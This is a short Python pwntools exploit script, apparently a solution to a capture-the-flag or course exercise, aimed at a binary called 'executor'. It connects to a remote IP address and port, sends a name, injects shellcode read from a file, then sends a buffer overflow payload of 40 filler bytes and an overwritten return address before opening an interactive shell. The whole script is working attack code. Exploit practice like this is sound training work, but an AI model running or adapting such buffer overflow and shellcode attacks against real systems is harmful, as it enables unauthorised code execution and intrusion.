#!/usr/bin/env python
from pwn import *


BIN = "./executor"
context.binary = BIN
elf = ELF(BIN)

# Later, we'll see how to use pwntools to solve this step as well.
with open("shellcode.bin", "rb") as fin:
    shellcode = fin.read()

io = remote("141.85.224.104", 6664)
# io = process(BIN)
io.sendline(b'Darius')
# gdb.attach("executor")
io.sendline(shellcode)
payload = b'A' * 40 + p64(0x6010a0)
io.sendline(payload)
io.interactive()
